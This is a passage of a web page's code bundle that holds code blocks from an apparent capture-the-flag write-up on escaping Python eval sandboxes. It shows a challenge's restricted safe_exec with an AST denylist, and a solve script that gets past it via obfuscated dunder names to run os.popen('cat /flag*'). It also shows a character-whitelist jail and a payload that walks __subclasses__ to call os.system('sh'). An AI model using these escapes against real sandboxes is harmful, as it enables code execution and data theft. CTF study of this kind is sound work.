    <span class="token builtin">globals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token builtin">locals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    fromlist<span class="token punctuation">:</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    level<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ModuleType<span class="token punctuation">:</span>
    <span class="token keyword">if</span> name <span class="token keyword">in</span> ALLOWED_IMPORTS<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">,</span> fromlist<span class="token punctuation">,</span> level<span class="token punctuation">)</span>
    <span class="token keyword">raise</span> ImportError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Import of module '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">' is not allowed"</span></span><span class="token punctuation">)</span>

ALLOWED_BUILTINS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"abs"</span><span class="token punctuation">:</span> <span class="token builtin">abs</span><span class="token punctuation">,</span>
    <span class="token string">"all"</span><span class="token punctuation">:</span> <span class="token builtin">all</span><span class="token punctuation">,</span>
    <span class="token string">"any"</span><span class="token punctuation">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    <span class="token string">"ascii"</span><span class="token punctuation">:</span> <span class="token builtin">ascii</span><span class="token punctuation">,</span>
    <span class="token string">"bin"</span><span class="token punctuation">:</span> <span class="token builtin">bin</span><span class="token punctuation">,</span>
    <span class="token string">"bool"</span><span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span>
    <span class="token string">"bytearray"</span><span class="token punctuation">:</span> <span class="token builtin">bytearray</span><span class="token punctuation">,</span>
    <span class="token string">"bytes"</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span>
    <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">,</span>
    <span class="token string">"complex"</span><span class="token punctuation">:</span> <span class="token builtin">complex</span><span class="token punctuation">,</span>
    <span class="token string">"divmod"</span><span class="token punctuation">:</span> <span class="token builtin">divmod</span><span class="token punctuation">,</span>
    <span class="token string">"enumerate"</span><span class="token punctuation">:</span> <span class="token builtin">enumerate</span><span class="token punctuation">,</span>
    <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>
    <span class="token string">"float"</span><span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">,</span>
    <span class="token string">"format"</span><span class="token punctuation">:</span> <span class="token builtin">format</span><span class="token punctuation">,</span>
    <span class="token string">"frozenset"</span><span class="token punctuation">:</span> <span class="token builtin">frozenset</span><span class="token punctuation">,</span>
    <span class="token string">"hash"</span><span class="token punctuation">:</span> <span class="token builtin">hash</span><span class="token punctuation">,</span>
    <span class="token string">"hex"</span><span class="token punctuation">:</span> <span class="token builtin">hex</span><span class="token punctuation">,</span>
    <span class="token string">"int"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    <span class="token string">"isinstance"</span><span class="token punctuation">:</span> <span class="token builtin">isinstance</span><span class="token punctuation">,</span>
    <span class="token string">"issubclass"</span><span class="token punctuation">:</span> <span class="token builtin">issubclass</span><span class="token punctuation">,</span>
    <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>
    <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>
    <span class="token string">"map"</span><span class="token punctuation">:</span> <span class="token builtin">map</span><span class="token punctuation">,</span>
    <span class="token string">"max"</span><span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token punctuation">,</span>
    <span class="token string">"min"</span><span class="token punctuation">:</span> <span class="token builtin">min</span><span class="token punctuation">,</span>
    <span class="token string">"oct"</span><span class="token punctuation">:</span> <span class="token builtin">oct</span><span class="token punctuation">,</span>
    <span class="token string">"ord"</span><span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">,</span>
    <span class="token string">"pow"</span><span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">,</span>
    <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>
    <span class="token string">"range"</span><span class="token punctuation">:</span> <span class="token builtin">range</span><span class="token punctuation">,</span>
    <span class="token string">"repr"</span><span class="token punctuation">:</span> <span class="token builtin">repr</span><span class="token punctuation">,</span>
    <span class="token string">"reversed"</span><span class="token punctuation">:</span> <span class="token builtin">reversed</span><span class="token punctuation">,</span>
    <span class="token string">"round"</span><span class="token punctuation">:</span> <span class="token builtin">round</span><span class="token punctuation">,</span>
    <span class="token string">"set"</span><span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">,</span>
    <span class="token string">"slice"</span><span class="token punctuation">:</span> <span class="token builtin">slice</span><span class="token punctuation">,</span>
    <span class="token string">"sorted"</span><span class="token punctuation">:</span> <span class="token builtin">sorted</span><span class="token punctuation">,</span>
    <span class="token string">"str"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token string">"sum"</span><span class="token punctuation">:</span> <span class="token builtin">sum</span><span class="token punctuation">,</span>
    <span class="token string">"tuple"</span><span class="token punctuation">:</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span>
    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token builtin">type</span><span class="token punctuation">,</span>
    <span class="token string">"zip"</span><span class="token punctuation">:</span> <span class="token builtin">zip</span><span class="token punctuation">,</span>
    <span class="token comment"># Constants</span>
    <span class="token string">"True"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token string">"False"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token string">"None"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token string">"__import__"</span><span class="token punctuation">:</span> _restricted_import<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_get_restricted_globals</span><span class="token punctuation">(</span>__globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    restricted_globals <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>ALLOWED_BUILTINS<span class="token punctuation">)</span>
    <span class="token keyword">if</span> __globals<span class="token punctuation">:</span>
        restricted_globals<span class="token punctuation">.</span>update<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span>
    <span class="token keyword">return</span> restricted_globals

vulnerable_code_snippets <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"os."</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">DunderVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">False</span>
        self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">False</span>

        builtins <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_builtins <span class="token operator">=</span> builtins

    <span class="token keyword">def</span> <span class="token function">visit_Name</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Attribute<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_contains_protected_access</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token comment"># do not allow imports</span>
    imports_modules <span class="token operator">=</span> <span class="token boolean">False</span>
    tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    <span class="token keyword">for</span> node <span class="token keyword">in</span> ast<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>Import<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

    dunder_visitor <span class="token operator">=</span> DunderVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    dunder_visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>

    <span class="token keyword">for</span> vulnerable_code_snippet <span class="token keyword">in</span> vulnerable_code_snippets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> vulnerable_code_snippet <span class="token keyword">in</span> code<span class="token punctuation">:</span>
            dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        dunder_visitor<span class="token punctuation">.</span>has_access_to_private_entity
        <span class="token keyword">or</span> dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin
        <span class="token keyword">or</span> imports_modules
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_verify_source_safety</span><span class="token punctuation">(</span>__source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Direct execution of CodeType is forbidden!"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        __source <span class="token operator">=</span> __source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> _contains_protected_access<span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>
            <span class="token string">"Execution of code containing references to private or dunder methods, "</span>
            <span class="token string">"disallowed builtins, or any imports, is forbidden!"</span>
        <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_exec</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span></code>`,Mp,dn,Na,ja,Ze,qp,yn,Zk=`<code class="language-py"><span class="token comment"># Using "with"-statement context managers to expose/retrieve Exception classes</span>
<span class="token comment"># https://rszalski.github.io/magicmethods/#context</span>
ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
obj <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
cus <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"\\137\\137exit\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>e<span class="token punctuation">,</span>v<span class="token punctuation">,</span>t<span class="token punctuation">:</span> <span class="token punctuation">[</span>ss<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"\\137\\137enter\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token boolean">None</span>
<span class="token keyword">with</span> cus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj<span class="token punctuation">.</span>lol
<span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
ex <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token string">"&#123;0.\\137\\137globals\\137\\137[\\137\\137builtins\\137\\137][\\137\\137import\\137\\137].lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token string">"&#123;0.popen.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"cat /flag*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#EOF</span></code>`,Np,bn,ua,Je,jp,mn,Sa,za,Qe,Sp,vn,Jk=`<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You get one chance to awaken from the ice prison."</span><span class="token punctuation">)</span>
code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span> <span class="token comment"># not the flag</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist <span class="token keyword">for</span> x <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40000</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Denied!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code>`,zp,wn,Ya,Wa,nc,Yp,gn,Qk=`<code class="language-py">m <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'&#123;a.__init__&#125;'][0].__init__.__builtins__['__import__']('os').system('sh')"""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> m<span class="token punctuation">]</span>
m <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

mapping <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span>
    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>
    <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
    <span class="token number">91</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+g+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
